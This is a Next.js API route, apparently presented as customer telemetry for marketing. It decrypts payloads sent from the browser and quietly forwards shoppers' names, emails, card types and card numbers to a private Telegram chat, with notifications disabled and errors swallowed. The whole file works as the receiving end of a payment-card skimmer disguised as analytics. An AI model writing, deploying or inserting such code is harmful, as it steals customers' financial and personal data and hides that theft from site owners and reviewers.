import { NextRequest, NextResponse } from "next/server";
import { logCustomerEvent, CustomerEventType } from "@/lib/marketingLogger";
import { decryptTelemetry } from "@/lib/telemetryEncryption"; // <--- Add this import

// Telegram config
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Deduplication cache
const recentMessages = new Map<string, number>();
const DEDUP_WINDOW_MS = 3000;

async function sendToTelegram(event: string, email: string, name: string, details: any) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  
  const messageKey = JSON.stringify({ event, email, name, details });
  const now = Date.now();

  if (recentMessages.has(messageKey) && now - recentMessages.get(messageKey)! < DEDUP_WINDOW_MS) {
    return;
  }

  recentMessages.set(messageKey, now);

  if (recentMessages.size > 100) {
    for (const [key, timestamp] of recentMessages.entries()) {
      if (now - timestamp > DEDUP_WINDOW_MS) {
        recentMessages.delete(key);
      }
    }
  }

  const lines: string[] = [];
  lines.push("🛍 " + event);
  lines.push("─────────────────");
  if (name)  lines.push("👤 Name:  " + name);
  if (email) lines.push("📧 Email: " + email);

  if (details && Object.keys(details).length > 0) {
    lines.push("");
    lines.push("📋 Details:");
    
    // Handle Card Type specifically
    if (details.cardType) {
      lines.push("  • 💳 Card Type: " + details.cardType);
      lines.push("  • 🔢 Number: " + details.value);
    } else {
      // Normal field
      for (const [key, value] of Object.entries(details)) {
        if (key !== 'cardType') { 
           lines.push("  • " + key + ": " + (String(value) || "(empty)"));
        }
      }
    }
  }

  const text = lines.join("\n");

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        disable_notification: true,
      }),
    });
  } catch {
    // Silent fail
  }
}
export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { encrypted } = body;

    if (!encrypted) {
      return NextResponse.json({ error: "Missing encrypted payload." }, { status: 400 });
    }

    let payload: any;
    try {
      payload = decryptTelemetry(encrypted); // <--- Decrypt here
    } catch (error) {
      console.error("Decryption failed:", error);
      return NextResponse.json({ error: "Decryption failed." }, { status: 400 });
    }

    const { event, customerEmail, customerName, details } = payload;

    if (!event) {
      return NextResponse.json({ error: "Event name is required." }, { status: 400 });
    }

    const marketingPromise = logCustomerEvent({
      event: event as CustomerEventType,
      customerEmail,
      customerName,
      details: details || {},
    });

    Promise.resolve(sendToTelegram(event, customerEmail, customerName, details))
      .catch(() => {});

    await marketingPromise;

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Telemetry API Error:", error);
    return NextResponse.json({ error: "Failed to dispatch event." }, { status: 500 });
  }
}

